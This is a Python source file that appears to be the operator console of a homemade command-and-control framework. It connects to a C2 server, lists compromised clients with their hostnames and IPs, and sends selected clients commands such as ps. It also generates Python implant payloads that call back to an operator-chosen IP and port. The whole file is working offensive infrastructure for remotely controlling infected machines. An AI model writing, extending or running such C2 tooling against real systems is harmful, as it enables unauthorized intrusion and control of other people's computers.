#!/bin/python3

from cmd2 import Cmd, Cmd2ArgumentParser, with_argparser
import argparse
import socket
from rich.console import Console
from rich.table import Table
import json

connect_argparser = Cmd2ArgumentParser()
connect_argparser.add_argument("--ip", required = True, help = "C2 address to connect to")
connect_argparser.add_argument("--port", help = "C2 port to connect to", default = 10000)

select_parser = Cmd2ArgumentParser()
select_parser.add_argument("id", help = "Client ID to interact with")

generate_parser = Cmd2ArgumentParser()
generate_parser.add_argument("--ip", required=True, help="Port for implant to call back to")
generate_parser.add_argument("--port", required=True, help="port for implant to call back too")
generate_parser.add_argument("--format", required=True, choices=['python'], help="Payload code format")
generate_parser.add_argument("--name", required=True, help="Name for the output file")


class App(Cmd):
    console = Console()
    intro = "Welcome to the listener interface\nConnect to C2 server to start\n"
    prompt = "(Disconnected): "
    connection = {
    "socket" : None,
    "address" : None,
    "port" : None
    }
    clients = {}


    @with_argparser(connect_argparser)
    def do_connect(self, args):
        """
        connect to C2 Server
        """
        try:
            self.connection["socket"] = socket.create_connection((args.ip, args.port))
            self.connection["address"] = args.ip
            self.connection["port"] = args.port
            self.console.log(f"Connected to {args.ip}")
            self.c2_ip = args.ip
            self.prompt = f"(Connected): "
        except:
            self.console.log(f"Unable to connect to {args.ip}")

    def do_disconnect(self, args):
        self.prompt = "(Disconnected): "
        self.console.log(f"Disconnected from C2 at {self.connection['address']}:{self.connection['port']}")
        self.connection["socket"] = None

    def do_get_clients(self, args):
        self.connection['socket'].send("get_clients".encode())
        data = self.connection['socket'].recv(1024)
        data = json.loads(data.decode())
        table = Table("Client ID", "Hostname", "Remote IP", "Remote Port", "Connection Time", title="Connected Clients")
        for key, val in data.items():
            if key not in self.clients:
                self.clients[key] = val
            table.add_row(str(key),str(val["info"]["hostname"]) ,str(val["connection"][0]), str(val["connection"][1]), f'{str(val["info"]["date"])} {str(val["info"]["time"])}')
        self.console.print(table)

    @with_argparser(select_parser)
    def do_select(self, args):
        self.client = args.id
        self.prompt = f"({self.clients[args.id]['info']['hostname']}): "

    def do_back(self, args):
        self.client = None
        self.prompt = "(Connected)"

    def do_test(self, args):
        self.send_command("test")

    def do_info(self, args):
        self.send_command("lsb_release")

    def do_ps(self, args):
        self.send_command("ps")

    def send_command(self, command):
        payload = {
            "client_id" : self.client,
            "command" : command
        }
        self.connection['socket'].send(json.dumps(payload).encode())
        response = self.connection['socket'].recv(50000)
        print(response.decode())
    
    @with_argparser(generate_parser)
    def do_generate_payload(self, args):
        self.do_run_pyscript(f"src/payload_templates/generate_python_payload.py --ip {args.ip} --port {args.port} --name {args.name}")
        print(f"Payload Saved to 'payloads/{args.name}'")
app = App()
app.cmdloop()
